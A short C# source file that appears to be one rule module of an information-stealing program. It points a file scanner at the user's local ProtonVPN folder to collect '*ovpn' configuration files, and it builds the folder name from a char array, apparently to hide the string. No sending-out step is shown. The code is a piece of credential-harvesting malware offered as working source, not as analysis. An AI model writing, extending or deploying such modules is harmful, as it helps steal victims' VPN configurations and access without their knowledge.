using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class ProtonVPNRule : FileScannerRule
    {
        public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
        {
            return string.Empty;
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                list.Add(new FileScannerArg
                {
                    Directory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Local"), new string(new char[9] { 'P', 'r', 'o', 't', 'o', 'n', 'V', 'P', 'N' })),
                    Pattern = "*ovpn",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
